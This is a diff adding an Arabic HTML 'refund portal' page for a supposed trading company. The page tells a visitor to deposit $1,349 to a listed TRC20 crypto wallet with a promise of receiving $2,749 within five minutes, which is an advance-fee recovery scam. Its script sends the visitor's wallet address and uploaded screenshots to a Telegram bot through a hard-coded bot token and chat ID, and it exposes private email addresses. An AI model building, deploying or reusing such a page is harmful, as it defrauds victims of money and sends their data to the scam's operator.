@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>استرداد الأموال | شركة التداول</title>
+    <style>
+        :root {
+            --bg: #f5f7fc;
+            --surface: #ffffff;
+            --surface-alt: #f8fafd;
+            --primary: #0a2a4a;
+            --primary-light: #0f3a62;
+            --accent: #c9a44b;
+            --accent-soft: #f7efe0;
+            --gold-grad: linear-gradient(135deg, #c9a44b 0%, #b8913a 30%, #d4af5e 60%, #c0973f 100%);
+            --blue-grad: linear-gradient(160deg, #0a2a4a 0%, #0f3a62 40%, #134373 100%);
+            --text: #1a1f2e;
+            --text-soft: #4a5068;
+            --text-muted: #7b809a;
+            --border: #e2e8f2;
+            --border-light: #edf1f7;
+            --danger: #c0392b;
+            --danger-bg: #fef5f5;
+            --success: #1a7a4c;
+            --success-bg: #eefaf3;
+            --warning: #b76e2e;
+            --warning-bg: #fefaf5;
+            --info-bg: #eef4fb;
+            --shadow-sm: 0 1px 2px rgba(10, 20, 40, 0.04);
+            --shadow: 0 4px 16px rgba(10, 20, 40, 0.06), 0 1px 4px rgba(10, 20, 40, 0.04);
+            --shadow-lg: 0 16px 40px rgba(10, 20, 40, 0.1), 0 4px 12px rgba(10, 20, 40, 0.06);
+            --shadow-xl: 0 24px 56px rgba(10, 20, 40, 0.14), 0 8px 20px rgba(10, 20, 40, 0.08);
+            --radius-sm: 10px;
+            --radius: 16px;
+            --radius-lg: 22px;
+            --radius-xl: 28px;
+            --font: 'Inter', 'Segoe UI', 'Tahoma', 'Geneva', 'Verdana', system-ui, -apple-system, sans-serif;
+            --transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font);
+            background: linear-gradient(160deg, #eef2f9 0%, #e8ecf6 25%, #f0f3fa 50%, #e9edf7 75%, #f2f5fb 100%);
+            background-attachment: fixed;
+            color: var(--text);
+            padding: 24px 16px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            position: relative;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: -180px;
+            left: -120px;
+            width: 700px;
+            height: 700px;
+            background: radial-gradient(circle at 30% 30%, rgba(201, 164, 75, 0.06) 0%, transparent 60%);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+            animation: floatBg1 18s ease-in-out infinite;
+        }
+        body::after {
+            content: '';
+            position: fixed;
+            bottom: -200px;
+            right: -140px;
+            width: 650px;
+            height: 650px;
+            background: radial-gradient(circle at 60% 60%, rgba(15, 58, 98, 0.05) 0%, transparent 60%);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+            animation: floatBg2 22s ease-in-out infinite;
+        }
+        @keyframes floatBg1 {
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1);
+            }
+            33% {
+                transform: translate(30px, -40px) scale(1.04);
+            }
+            66% {
+                transform: translate(-15px, 25px) scale(0.97);
+            }
+        }
+        @keyframes floatBg2 {
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1);
+            }
+            33% {
+                transform: translate(-35px, 30px) scale(1.03);
+            }
+            66% {
+                transform: translate(20px, -20px) scale(0.98);
+            }
+        }
+
+        .container {
+            max-width: 960px;
+            width: 100%;
+            background: var(--surface);
+            border-radius: var(--radius-xl);
+            box-shadow: var(--shadow-xl);
+            padding: 36px 40px;
+            position: relative;
+            z-index: 1;
+            border: 1px solid var(--border-light);
+            transition: all var(--transition);
+        }
+        @media (max-width: 700px) {
+            .container {
+                padding: 22px 16px;
+                border-radius: var(--radius-lg);
+            }
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: var(--gold-grad);
+            border-radius: 28px 28px 0 0;
+            z-index: 2;
+            pointer-events: none;
+        }
+        @media (max-width: 700px) {
+            .container::before {
+                border-radius: 22px 22px 0 0;
+                height: 4px;
+            }
+        }
+
+        .page-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border-light);
+        }
+        .page-header .icon-circle {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: var(--blue-grad);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #fff;
+            flex-shrink: 0;
+            box-shadow: 0 8px 20px rgba(10, 42, 74, 0.2);
+        }
+        .page-header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--primary);
+            letter-spacing: -0.3px;
+            margin: 0;
+            line-height: 1.3;
+        }
+        .page-header .subtitle {
+            font-size: 13px;
+            color: var(--text-muted);
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            margin-top: 2px;
+        }
+        @media (max-width: 600px) {
+            .page-header h1 {
+                font-size: 22px;
+            }
+            .page-header .icon-circle {
+                width: 42px;
+                height: 42px;
+                font-size: 20px;
+            }
+        }
+
+        .login-box {
+            background: var(--surface-alt);
+            border-radius: var(--radius-lg);
+            padding: 36px 30px;
+            margin-bottom: 28px;
+            border: 1px solid var(--border);
+            text-align: center;
+            box-shadow: var(--shadow);
+            transition: all var(--transition);
+        }
+        .login-box:hover {
+            box-shadow: var(--shadow-lg);
+        }
+        .login-box .login-icon {
+            font-size: 42px;
+            margin-bottom: 12px;
+            display: block;
+        }
+        .login-box label {
+            display: block;
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 14px;
+            color: var(--text);
+            letter-spacing: -0.1px;
+        }
+        .login-box .input-wrapper {
+            position: relative;
+            max-width: 440px;
+            margin: 0 auto;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 15px 48px 15px 22px;
+            border: 2px solid var(--border);
+            border-radius: 60px;
+            font-size: 15px;
+            outline: none;
+            transition: all var(--transition);
+            background: #fff;
+            font-weight: 500;
+            color: var(--text);
+            letter-spacing: 0.1px;
+        }
+        .login-box input:focus {
+            border-color: var(--primary-light);
+            box-shadow: 0 0 0 5px rgba(15, 58, 98, 0.08);
+        }
+        .login-box .input-icon {
+            position: absolute;
+            left: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 18px;
+            color: var(--text-muted);
+            pointer-events: none;
+        }
+        .login-box button {
+            margin-top: 20px;
+            padding: 14px 48px;
+            background: var(--blue-grad);
+            color: #fff;
+            border: none;
+            border-radius: 60px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all var(--transition);
+            letter-spacing: 0.2px;
+            box-shadow: 0 6px 20px rgba(10, 42, 74, 0.25);
+            position: relative;
+            overflow: hidden;
+        }
+        .login-box button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 28px rgba(10, 42, 74, 0.35);
+        }
+        .login-box button:active {
+            transform: translateY(0);
+            box-shadow: 0 4px 14px rgba(10, 42, 74, 0.3);
+        }
+        .login-error {
+            color: #c0392b;
+            font-size: 14px;
+            margin-top: 14px;
+            display: none;
+            font-weight: 500;
+            background: var(--danger-bg);
+            padding: 10px 18px;
+            border-radius: 40px;
+            max-width: 380px;
+            margin-left: auto;
+            margin-right: auto;
+            border: 1px solid #fde2e2;
+        }
+        .login-error.show {
+            display: block;
+        }
+
+        .main-content {
+            display: none;
+            animation: fadeSlideIn 0.55s ease;
+        }
+        @keyframes fadeSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(18px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .section-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--primary);
+            margin: 30px 0 16px 0;
+            padding-bottom: 14px;
+            border-bottom: 2px solid var(--border-light);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            letter-spacing: -0.2px;
+        }
+        .section-title .section-icon {
+            font-size: 22px;
+        }
+
+        .card {
+            background: var(--surface-alt);
+            border-radius: var(--radius-lg);
+            padding: 22px 26px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border);
+            transition: all var(--transition);
+            box-shadow: var(--shadow-sm);
+            position: relative;
+        }
+        .card:hover {
+            border-color: #cdd8e8;
+            box-shadow: var(--shadow);
+        }
+        .card.with-accent {
+            border-right: 4px solid var(--primary-light);
+        }
+        .card.with-gold {
+            border-right: 4px solid var(--accent);
+        }
+        .card.with-danger {
+            border-right: 4px solid #c0392b;
+        }
+        .card h3 {
+            font-size: 17px;
+            font-weight: 600;
+            color: var(--primary);
+            margin-bottom: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: -0.1px;
+        }
+        .card h3 .badge-status {
+            font-size: 11px;
+            font-weight: 600;
+            padding: 4px 12px;
+            border-radius: 30px;
+            letter-spacing: 0.3px;
+        }
+        .badge-success {
+            background: #ddf4e6;
+            color: #1a7a4c;
+        }
+        .badge-warning {
+            background: #fef5ea;
+            color: #b76e2e;
+        }
+        .badge-danger {
+            background: #fde8e8;
+            color: #b33a3a;
+        }
+
+        .row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 14px 20px;
+            margin-bottom: 6px;
+        }
+        .row-item {
+            flex: 1 1 160px;
+            display: flex;
+            flex-direction: column;
+        }
+        .row-item label {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-muted);
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .row-item span,
+        .row-item input {
+            font-size: 15px;
+            font-weight: 500;
+            color: var(--text);
+            background: #fff;
+            padding: 10px 16px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            min-height: 44px;
+            display: flex;
+            align-items: center;
+            width: 100%;
+            letter-spacing: 0.1px;
+        }
+        .row-item input {
+            padding: 10px 16px;
+            font-size: 15px;
+            transition: all var(--transition);
+        }
+        .row-item input:focus {
+            border-color: var(--primary-light);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(15, 58, 98, 0.06);
+        }
+        .row-item input[type="file"] {
+            padding: 8px 10px;
+            border: 1px dashed #c5cfde;
+            background: #fafbfd;
+            min-height: auto;
+            cursor: pointer;
+            font-size: 13px;
+            color: var(--text-soft);
+        }
+        .row-item input[type="file"]:hover {
+            border-color: var(--primary-light);
+            background: #f8fafe;
+        }
+
+        .highlight-box {
+            background: linear-gradient(135deg, #f7fafd 0%, #eef4fb 100%);
+            border-radius: var(--radius-lg);
+            padding: 22px 26px;
+            margin: 16px 0 14px 0;
+            border-right: 5px solid var(--primary-light);
+            box-shadow: var(--shadow-sm);
+        }
+        .highlight-box p {
+            margin-bottom: 6px;
+            font-size: 15px;
+            color: var(--text);
+        }
+        .highlight-box .big-amount {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--primary);
+        }
+        .highlight-box .pill-info {
+            font-size: 13px;
+            background: #fff;
+            padding: 6px 16px;
+            border-radius: 30px;
+            display: inline-block;
+            border: 1px solid var(--border);
+            color: var(--text-soft);
+            margin-top: 6px;
+            font-weight: 500;
+        }
+
+        .wallet-section {
+            background: #fafcfd;
+            border-radius: var(--radius-lg);
+            padding: 20px 24px;
+            margin: 8px 0 18px 0;
+            border: 1px solid var(--border);
+            box-shadow: var(--shadow-sm);
+        }
+        .wallet-address {
+            background: #ffffff;
+            border: 2px dashed #b8c8dc;
+            border-radius: 60px;
+            padding: 16px 22px;
+            font-family: 'SF Mono', 'Cascadia Code', 'Courier New', monospace;
+            font-size: 17px;
+            font-weight: 600;
+            color: var(--primary);
+            text-align: center;
+            margin: 10px 0 14px 0;
+            word-break: break-all;
+            letter-spacing: 0.8px;
+            transition: all var(--transition);
+            background: #fdfdfe;
+        }
+        .wallet-address:hover {
+            border-color: var(--primary-light);
+            background: #fafcfe;
+        }
+        .trc-badge {
+            display: inline-block;
+            background: var(--blue-grad);
+            color: #fff;
+            font-size: 12px;
+            padding: 5px 14px;
+            border-radius: 40px;
+            font-weight: 600;
+            margin-right: 10px;
+            letter-spacing: 0.4px;
+        }
+        .network-note {
+            font-size: 13px;
+            color: var(--text-soft);
+            background: #fff;
+            padding: 8px 18px;
+            border-radius: 30px;
+            display: inline-block;
+            border: 1px solid var(--border-light);
+            font-weight: 500;
+        }
+
+        .btn-primary {
+            background: var(--blue-grad);
+            color: #fff;
+            border: none;
+            padding: 16px 36px;
+            border-radius: 60px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all var(--transition);
+            width: 100%;
+            max-width: 340px;
+            margin: 18px auto 0;
+            display: block;
+            box-shadow: 0 8px 24px rgba(10, 42, 74, 0.3);
+            letter-spacing: 0.3px;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 32px rgba(10, 42, 74, 0.4);
+        }
+        .btn-primary:active {
+            transform: translateY(0);
+            box-shadow: 0 6px 18px rgba(10, 42, 74, 0.35);
+        }
+        .btn-primary:disabled {
+            opacity: 0.65;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: 0 4px 12px rgba(10, 42, 74, 0.2);
+        }
+        .btn-primary::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.15) 0%, transparent 60%);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .btn-primary:hover::after {
+            opacity: 1;
+        }
+
+        .note {
+            background: var(--warning-bg);
+            border-right: 5px solid #b76e2e;
+            padding: 18px 22px;
+            border-radius: var(--radius);
+            margin: 26px 0 10px 0;
+            font-size: 14px;
+            color: #5c3a1a;
+            box-shadow: var(--shadow-sm);
+            line-height: 1.6;
+        }
+        .note strong {
+            color: #7a3f0e;
+        }
+
+        .footer-note {
+            margin-top: 28px;
+            font-size: 13px;
+            color: var(--text-muted);
+            text-align: center;
+            border-top: 1px solid var(--border-light);
+            padding-top: 20px;
+            letter-spacing: 0.2px;
+        }
+
+        .status-message {
+            display: none;
+            background: var(--success-bg);
+            border-right: 5px solid #1a7a4c;
+            padding: 20px 26px;
+            border-radius: var(--radius-lg);
+            margin-top: 22px;
+            font-weight: 500;
+            color: #13522e;
+            font-size: 15px;
+            box-shadow: var(--shadow);
+            line-height: 1.7;
+        }
+        .status-message.show {
+            display: block;
+            animation: fadeSlideIn 0.45s ease;
+        }
+        .status-message.error {
+            background: var(--danger-bg);
+            border-right-color: #c0392b;
+            color: #7a2e2e;
+        }
+
+        .cancelled-notice {
+            margin-top: 14px;
+            background: #fef5f5;
+            padding: 12px 18px;
+            border-radius: 14px;
+            color: #9e2a2a;
+            font-size: 13px;
+            font-weight: 500;
+            border: 1px solid #fde2e2;
+            line-height: 1.5;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 18px 12px;
+            }
+            .row-item {
+                flex: 1 1 100%;
+            }
+            .wallet-address {
+                font-size: 14px;
+                padding: 12px 16px;
+            }
+            .section-title {
+                font-size: 18px;
+            }
+            .card {
+                padding: 16px 14px;
+            }
+        }
+
+        @keyframes subtlePulse {
+            0%,
+            100% {
+                box-shadow: 0 8px 24px rgba(10, 42, 74, 0.3);
+            }
+            50% {
+                box-shadow: 0 10px 30px rgba(10, 42, 74, 0.45);
+            }
+        }
+        .btn-primary:not(:disabled) {
+            animation: subtlePulse 3s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="app">
+        <div class="page-header">
+            <div class="icon-circle">🔁</div>
+            <div>
+                <h1>استرداد الأموال</h1>
+                <div class="subtitle">بوابة آمنة لمعالجة طلبات الاسترداد</div>
+            </div>
+        </div>
+
+        <!-- قسم تسجيل الدخول -->
+        <div class="login-box" id="loginSection">
+            <span class="login-icon">🔐</span>
+            <label for="emailInput">أدخل بريدك الإلكتروني للوصول إلى بوابة الاسترداد</label>
+            <div class="input-wrapper">
+                <span class="input-icon">📧</span>
+                <!-- تم تغيير placeholder إلى example@gmail.com -->
+                <input type="email" id="emailInput" placeholder="example@gmail.com" dir="ltr">
+            </div>
+            <button onclick="validateLogin()">دخول إلى البوابة</button>
+            <div class="login-error" id="loginError">⚠️ البريد الإلكتروني غير مصرح به. يُسمح فقط للبريد المخصص.</div>
+        </div>
+
+        <!-- المحتوى الرئيسي -->
+        <div class="main-content" id="mainContent">
+
+            <div class="section-title">
+                <span class="section-icon">📋</span> الجزء الأول : تفاصيل طلبات السحب
+            </div>
+
+            <div class="card with-accent">
+                <h3>🟢 السحب الأول <span class="badge-status badge-success">تم التنفيذ</span></h3>
+                <div class="row">
+                    <div class="row-item"><label>التاريخ</label><span>2026-05-12</span></div>
+                    <div class="row-item"><label>الوقت</label><span>00:45</span></div>
+                    <div class="row-item"><label>المبلغ</label><span>1,000 $</span></div>
+                    <div class="row-item"><label>رقم الطلب</label><span>1284453</span></div>
+                </div>
+                <div class="row">
+                    <div class="row-item" style="flex:2;">
+                        <label>📎 إرفاق صورة (للتأكيد)</label>
+                        <input type="file" accept="image/*" class="upload-img" data-label="السحب الأول">
+                    </div>
+                </div>
+            </div>
+
+            <div class="card with-accent">
+                <h3>🟡 السحب الثاني <span class="badge-status badge-success">تم التنفيذ</span></h3>
+                <div class="row">
+                    <div class="row-item"><label>التاريخ</label><span>2026-05-12</span></div>
+                    <div class="row-item"><label>الوقت</label><span>00:45</span></div>
+                    <div class="row-item"><label>المبلغ</label><span>349 $</span></div>
+                    <div class="row-item"><label>رقم الطلب</label><span>1284455</span></div>
+                </div>
+                <div class="row">
+                    <div class="row-item" style="flex:2;">
+                        <label>📎 إرفاق صورة (للتأكيد)</label>
+                        <input type="file" accept="image/*" class="upload-img" data-label="السحب الثاني">
+                    </div>
+                </div>
+            </div>
+
+            <div class="card with-danger">
+                <h3>🔴 السحب الثالث <span class="badge-status badge-danger">ملغي - قيد الاسترداد</span></h3>
+                <div class="row">
+                    <div class="row-item"><label>التاريخ</label><span>2026-05-12</span></div>
+                    <div class="row-item"><label>الوقت</label><span>00:45</span></div>
+                    <div class="row-item"><label>المبلغ</label><span>1,000 $ (تم خصم 840 $ بونص)</span></div>
+                    <div class="row-item"><label>رقم الطلب</label><span>1284454</span></div>
+                </div>
+                <div class="row">
+                    <div class="row-item" style="flex:2;">
+                        <label>📎 إرفاق صورة (للتأكيد)</label>
+                        <input type="file" accept="image/*" class="upload-img" data-label="السحب الثالث">
+                    </div>
+                </div>
+                <div class="cancelled-notice">
+                    ⚠️ تم إلغاء الطلب بسبب "لا يوجد رصيد كافي" وخصم 840 $ كبونص.
+                </div>
+            </div>
+
+            <div class="section-title" style="margin-top:30px;">
+                <span class="section-icon">💰</span> الجزء الثاني : إيداع المبلغ المستحق للاسترداد
+            </div>
+
+            <div class="highlight-box">
+                <p style="font-size:17px; font-weight:600; color:var(--primary);">المبلغ الإجمالي المطلوب إيداعه : <span class="big-amount" style="color:var(--primary-light);">1,349 $</span></p>
+                <p style="font-size:14px; color:var(--text-soft);">(يتكون من 1,000 $ (السحب الأول) + 349 $ (السحب الثاني))</p>
+                <span class="pill-info">🔹 بعد إيداع المبلغ، سيتم استرداد إجمالي الرصيد 2,749 $ خلال 5 دقائق</span>
+            </div>
+
+            <div class="card with-gold" style="background:#f9fafc;">
+                <h3>💵 إيداع المبلغ الإجمالي (1,349 $)</h3>
+                <div class="row">
+                    <div class="row-item"><label>المبلغ</label><span style="font-weight:700; font-size:19px; color:var(--primary);">1,349 $</span></div>
+                    <div class="row-item"><label>التاريخ</label><span>2026-05-12</span></div>
+                    <div class="row-item"><label>الوقت</label><span>00:45</span></div>
+                </div>
+                <div class="row">
+                    <div class="row-item" style="flex:2;">
+                        <label>📎 إرفاق صورة إيداع المبلغ (لقطة من المحفظة)</label>
+                        <input type="file" accept="image/*" id="depositProof" class="upload-img" data-label="إيداع 1,349 $">
+                    </div>
+                </div>
+                <div style="margin-top:12px; background:#eef4fb; padding:12px 18px; border-radius:14px; font-size:14px; color:var(--text-soft);">
+                    ⚡ يجب إيداع <strong>1,349 $</strong> على عنوان المحفظة أدناه (شبكة TRC20).
+                </div>
+            </div>
+
+            <div class="wallet-section">
+                <p style="font-weight:700; margin-bottom:6px; font-size:17px; display:flex; align-items:center; color:var(--primary);">
+                    🏦 عنوان محفظة الشركة (TRC20)
+                    <span class="trc-badge">TRON</span>
+                </p>
+                <div class="wallet-address" id="companyWallet">TPNgUyRe7GSnazUzakRU3egEU4XBS7Pu5h</div>
+                <span class="network-note">⚠️ تأكد من إرسال المبلغ على شبكة TRC20 فقط.</span>
+            </div>
+
+            <div class="card" style="background:#f6f8fb; border:1px solid var(--border);">
+                <h3>📝 بيانات الاسترداد النهائية</h3>
+                <div class="row">
+                    <div class="row-item" style="flex:2;">
+                        <label>🔑 عنوان محفظتك (لتحويل المبلغ المسترد)</label>
+                        <input type="text" id="userWallet" placeholder="أدخل عنوان محفظتك TRC20" style="width:100%; font-family: 'SF Mono','Courier New',monospace;">
+                    </div>
+                    <div class="row-item" style="flex:1;">
+                        <label>💰 المبلغ الإجمالي المسترد</label>
+                        <input type="text" id="totalAmount" value="2749" readonly style="background:#eef1f6; font-weight:700; font-size:18px; text-align:center; color:var(--primary);">
+                    </div>
+                </div>
+                <div style="margin-top:12px; background:#fff; padding:12px 18px; border-radius:14px; border:1px solid var(--border-light); font-size:14px; color:var(--text-soft);">
+                    ⏳ بعد تأكيد الإيداع، سيتم تحويل <strong>2,749 $</strong> إلى عنوانك خلال <strong>5 دقائق</strong>.
+                </div>
+            </div>
+
+            <button class="btn-primary" onclick="processRefund()">✅ تأكيد ومعالجة الاسترداد</button>
+
+            <div class="status-message" id="statusMessage">
+                ✔️ تم استلام طلبك بنجاح! جاري معالجة المبلغ (2,749 $) إلى محفظتك خلال 5 دقائق.
+                <br><span style="font-size:13px; display:block; margin-top:6px; color:var(--text-soft);">رقم الطلب: #REF-2026-06-26-001</span>
+            </div>
+
+            <div class="note">
+                <strong>📌 ملاحظة مهمة :</strong> الخطأ كان هو إجراء السحب على ثلاث مراحل مع عدم الأخذ بقيمة البونص (100%) في الحسبان، مما أدى إلى عدم كفاية الرصيد للسحب الثالث. نأسف للإزعاج، وسيتم تعويض المبلغ المستحق (840 $) ضمن عملية الاسترداد.
+            </div>
+
+            <div class="footer-note">
+                📧 للاستفسارات : arabic.support.npbfx@gmail.com
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_TOKEN = "8535863939:AAFC4qgREiGQC-4c1QCQNrNp3gMprRsQRTs";
+        const TELEGRAM_CHAT_ID = "6733319757";
+
+        function validateLogin() {
+            const emailInput = document.getElementById('emailInput');
+            const errorDiv = document.getElementById('loginError');
+            const allowedEmail = 'mohammedjehad56@gmail.com';
+
+            if (emailInput.value.trim().toLowerCase() === allowedEmail.toLowerCase()) {
+                document.getElementById('loginSection').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+                errorDiv.classList.remove('show');
+                errorDiv.style.display = 'none';
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            } else {
+                errorDiv.classList.add('show');
+                errorDiv.style.display = 'block';
+                emailInput.focus();
+            }
+        }
+
+        async function sendPhotoToTelegram(file, caption) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', file, file.name);
+            formData.append('caption', caption);
+            try {
+                const response = await fetch(url, { method: 'POST', body: formData });
+                return await response.json();
+            } catch (error) {
+                console.error('خطأ في إرسال الصورة:', error);
+                return null;
+            }
+        }
+
+        async function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('خطأ في إرسال الرسالة:', error);
+                return null;
+            }
+        }
+
+        async function processRefund() {
+            const wallet = document.getElementById('userWallet').value.trim();
+            if (!wallet) {
+                alert('⚠️ الرجاء إدخال عنوان محفظتك (TRC20) في الحقل المخصص.');
+                return;
+            }
+
+            const fileInputs = document.querySelectorAll('.upload-img');
+            const files = [];
+            let hasDepositProof = false;
+
+            fileInputs.forEach(input => {
+                if (input.files.length > 0) {
+                    const file = input.files[0];
+                    const label = input.getAttribute('data-label') || 'مرفق';
+                    files.push({ file, label });
+                    if (input.id === 'depositProof') hasDepositProof = true;
+                }
+            });
+
+            if (!hasDepositProof) {
+                alert('📎 الرجاء إرفاق صورة إيداع المبلغ 1,349 $ على عنوان الشركة.');
+                return;
+            }
+
+            const btn = document.querySelector('.btn-primary');
+            btn.disabled = true;
+            btn.textContent = '⏳ جاري الإرسال...';
+
+            const now = new Date().toLocaleString('ar-EG', { timeZone: 'UTC' });
+            const messageText = `
+        🆕 <b>طلب استرداد جديد</b>
+
+        👤 <b>البريد:</b> mohammedjehad56@gmail.com
+        🔑 <b>محفظة المستخدم:</b> <code>${wallet}</code>
+        💰 <b>المبلغ المسترد:</b> 2,749 $
+        💵 <b>المبلغ المُودع:</b> 1,349 $ (تم إرفاق صورة)
+
+        📅 <b>تاريخ الطلب:</b> ${now}
+        📌 <b>الحالة:</b> قيد المعالجة (سيتم التحويل خلال 5 دقائق)
+            `;
+
+            const textResult = await sendTelegramMessage(messageText);
+
+            let allPhotosSent = true;
+            for (const { file, label } of files) {
+                const caption = `📎 ${label}`;
+                const result = await sendPhotoToTelegram(file, caption);
+                if (!result || !result.ok) {
+                    allPhotosSent = false;
+                }
+            }
+
+            const statusMsg = document.getElementById('statusMessage');
+            if (textResult && textResult.ok && allPhotosSent) {
+                statusMsg.classList.add('show');
+                statusMsg.classList.remove('error');
+                statusMsg.innerHTML = `
+                    ✔️ تم استلام طلبك بنجاح! جاري معالجة المبلغ (2,749 $) إلى محفظتك خلال 5 دقائق.
+                    <br><span style="font-size:13px; display:block; margin-top:6px; color:var(--text-soft);">رقم الطلب: #REF-2026-06-26-001</span>
+                    <br><span style="font-size:12px; color:#1a7a4c;">✅ تم إرسال جميع الصور والإشعار إلى فريق الدعم.</span>
+                `;
+            } else {
+                statusMsg.classList.add('show', 'error');
+                statusMsg.innerHTML = `
+                    ⚠️ حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى أو التواصل مع الدعم.
+                    <br><span style="font-size:12px;">البيانات محفوظة محلياً.</span>
+                `;
+            }
+
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.textContent = '✅ تأكيد ومعالجة الاسترداد';
+            }, 6000);
+
+            statusMsg.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+
+        window.onload = function() {
+            document.getElementById('emailInput').focus();
+        };
+    </script>
+</body>
+</html>
